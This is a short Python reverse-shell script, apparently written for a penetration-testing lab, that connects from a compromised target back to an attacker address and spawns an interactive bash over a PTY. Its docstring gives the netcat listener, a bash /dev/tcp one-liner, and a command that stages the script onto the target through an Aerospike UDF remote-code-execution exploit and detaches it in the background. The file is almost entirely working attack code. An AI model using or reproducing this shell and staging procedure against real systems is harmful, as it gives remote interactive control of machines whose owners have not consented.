#!/usr/bin/env python3
"""Reverse shell with a real PTY — runs on the *target*, connecting back to the attacker.

A plain `bash -i >& /dev/tcp/…` gives a pipe: no job control, no sudo prompt, no
`su`, no `ssh` password entry. pty.spawn() gives the socket a terminal so those work.

Kali listener (pick a port the lab's egress allowlist permits — 3000 on this box):

    nc -lvnp 3000

Stage and detach it through the Aerospike UDF:

    python3 poc_aerospike_rce.py --ahost 192.168.152.143 --cmd 'cat > /tmp/.rs.py <<"PY"
    <contents of this file>
    PY
    setsid nohup python3 /tmp/.rs.py >/dev/null 2>&1 </dev/null &'

Or send the whole thing as a file with aero_cmd.py --cmd-file stage.sh.

Edit HOST/PORT below, or pass them as argv: python3 .rs.py 192.168.45.158 3000
"""
import os
import pty
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.45.158"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3000

s = socket.socket()
s.connect((HOST, PORT))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/bash")
